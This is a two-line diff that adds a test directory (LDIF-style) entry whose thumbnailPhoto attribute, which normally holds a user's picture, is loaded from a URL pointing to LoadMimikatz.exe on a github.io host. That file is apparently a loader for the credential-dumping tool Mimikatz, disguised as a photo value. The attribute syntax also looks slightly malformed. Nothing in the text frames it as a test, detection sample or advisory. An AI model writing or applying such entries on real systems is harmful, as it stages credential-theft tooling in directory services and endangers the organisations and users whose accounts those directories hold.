@@ -1,0 +1,2 @@
+dn: cn=test
+thumbnailPhoto=< https://hakkyahud.github.io/LoadMimikatz.exe
